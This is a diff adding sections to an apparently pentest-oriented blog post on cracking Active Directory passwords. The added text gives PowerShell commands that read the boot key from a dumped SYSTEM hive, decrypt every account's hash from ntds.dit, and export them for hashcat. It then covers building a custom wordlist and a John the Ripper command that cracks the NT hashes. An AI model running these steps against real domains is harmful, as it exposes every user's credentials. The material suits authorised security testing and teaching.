@@ -75,3 +75,29 @@ Import-Module -Name "C:\Users\mayerm.ATSICONNEX\Documents\Powershell Modules\DSI
 ```
 
 <img src="../img/blog-22-adcrack-importmodule.png" width="750">
+
+```ps1
+# First, we fetch the so-called Boot Key (aka SysKey) that is used to encrypt sensitive data in AD
+$key = Get-BootKey -SystemHivePath 'C:\temp\ntdsdump\Active Directory\registry\SYSTEM'
+ 
+# We then load the DB and decrypt password hashes of all accounts
+Get-ADDBAccount -All -DBPath 'C:\temp\ntdsdump\Active Directory\ntds.dit' -BootKey $key
+
+# To make the hashes useable with johntheripper, ophcrack or hashcat
+Get-ADDBAccount -All -DBPath 'C:\temp\ntdsdump\Active Directory\ntds.dit' -BootKey $key |
+   Format-Custom -View HashcatNT |
+   Out-File hashes.txt -Encoding ASCII
+```
+
+### Creating the wordlist
+
+When pentesting a company it's always useful to create an additional wordlist with words related to the location and name. There are some easy tools to create wordlist with that information; for example [Weakpass Generator](https://weakpass.com/generate). Here we add some words to create a custom wordlist, which we can later merge with an actual one.
+
+<img src="../img/`blog-22-adcrack-weakpass.png" width="1000">
+
+
+### Cracking the hash
+
+```john --session=ntlm_hases --wordlist=/home/kali/wordlist.txt --rules=Jumbo --fork=8 --format=nt --pot=ntlm.pot  /home/kali/Desktop/ntdsdump/hashes.txt```
+
+
